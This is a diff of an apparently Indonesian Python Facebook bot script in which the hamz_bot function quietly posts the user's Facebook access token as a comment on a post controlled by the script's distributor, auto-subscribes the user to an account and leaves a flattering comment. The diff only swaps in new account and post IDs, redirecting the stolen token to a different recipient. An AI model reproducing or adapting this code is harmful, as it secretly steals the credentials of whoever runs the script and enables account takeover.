@@ -348,10 +348,10 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100018838477146:] Script Nya Mantep Ngga Ada Obat 😘😘😘😘"
-    requests.post('https://graph.facebook.com/100018838477146/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/868211530483455/comments/?message=' +token+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/868211530483455/comments/?message=' +kom+ '&access_token=' + token)
+    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
     menu()
     
 def jalan(z):
